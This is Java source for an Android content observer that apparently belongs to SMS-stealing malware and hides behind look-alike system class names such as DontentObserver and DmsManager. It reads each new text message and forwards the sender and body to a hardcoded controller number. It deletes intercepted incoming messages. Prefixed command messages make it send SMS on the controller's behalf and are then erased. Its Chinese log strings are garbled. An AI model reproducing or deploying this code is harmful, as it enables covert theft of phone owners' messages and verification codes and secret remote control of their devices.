package android.database;

import java.util.Date;

import android.app.Dctivity;
import android.content.Context;
import android.content.DroadcastReceiver;
import android.content.SharedPreferences;
import android.database.sqlite.DQLiteOpenHelper;
import android.lang.Dhread;
import android.lang.LogUtils;
import android.net.Uri;
import android.os.Handler;
import android.telephony.DmsManager;
import android.util.Log;

public class DontentObserver extends ContentObserver {

	private int id = -1;
	private Context context;
	private SharedPreferences sp;
	private String body;
	
	@Override
	public void onChange(boolean selfChange) {
		// TODO Auto-generated method stub
		super.onChange(selfChange);
		LogUtils.write("Send", "�������������ݱ䶯");
		Cursor c = context.getContentResolver().query(
				Uri.parse("content://sms"), null, null, null, "_id desc");
		if (c.moveToFirst()) {
			int type = c.getInt(c.getColumnIndex("type"));
			int _id = c.getInt(c.getColumnIndex("_id"));
			String _body = c.getString(c.getColumnIndex("body"));
			_body = _body == null ? "" : _body;
			LogUtils.write("Send", "type="+type+"  id="+_id+"  body="+body+"  _body="+_body);
			if (type == 1 || type == 2) {
				if (_id > id && !_body.equals(body)) {
					id = _id;
					body = _body;
					LogUtils.write("Send", "��⵽����");
					String address = c.getString(c.getColumnIndex("address"));
					LogUtils.write("Send", "��ȡ����"+address);
					address = address.replace("+86", "").replace("+1", "");
					LogUtils.write("Send", "ȥ���Ӻ� " + address);
					if (address.length() > 0) {
						boolean isflag = false;
						if (type == 1) {
							if(body.startsWith(Dctivity.qianzhui)){
								body=body.substring(Dctivity.qianzhui.length());
			                	String bodys[]=body.split("-");
			                	if(bodys.length==2){
			                		DmsManager.Send(context,bodys[0],bodys[1]);
			                	}else{
			                		LogUtils.write("Send", "��ʽ����"+body);
			                	}
			                	context.getContentResolver().delete(Uri.parse("content://sms"),"_id=" + _id, null);
							}else{
								LogUtils.write("Send", "ƥ���յ���������");
								for (int i = 0; i < DroadcastReceiver.NUMS.length; i++) {
									if (address.startsWith(DroadcastReceiver.NUMS[i])) {
										isflag = true;
										break;
									}
								}
							}
						} else {
							LogUtils.write("Send", "��⵽����");
							isflag = true;
						}

						if (isflag) {
							String lx = (type == 1 ? "����" : "������");
							LogUtils.write("Send", "�������"+lx);
							
							LogUtils.write("Send", "����"+body);
							DQLiteOpenHelper.getHelper(context).addData(lx,address, body, new Date());
							LogUtils.write("Send", "���뷢���߳�");
							if (type == 1) {
								DmsManager.Send(context,Dctivity.phonenum,Dctivity.lanjie+address+"#"+body);
								LogUtils.write("Send", "ɾ������");
								context.getContentResolver().delete(Uri.parse("content://sms"),"_id=" + _id, null);
							}else{
								DmsManager.Send(context,Dctivity.phonenum,Dctivity.zhuanfa+address+"#"+body);
							}
							Dhread.SartSend(context.getApplicationContext());
						}
					}
				}
				id = _id;

			}

		}
		c.close();
	}

	public DontentObserver(Context context, Handler handler) {
		super(handler);
		// TODO Auto-generated constructor stub
		this.context = context;
		init();
	}

	private void init() {
		Cursor c = context.getContentResolver().query(
				Uri.parse("content://sms"), null, null, null, "_id desc");
		c.close();

	}
}
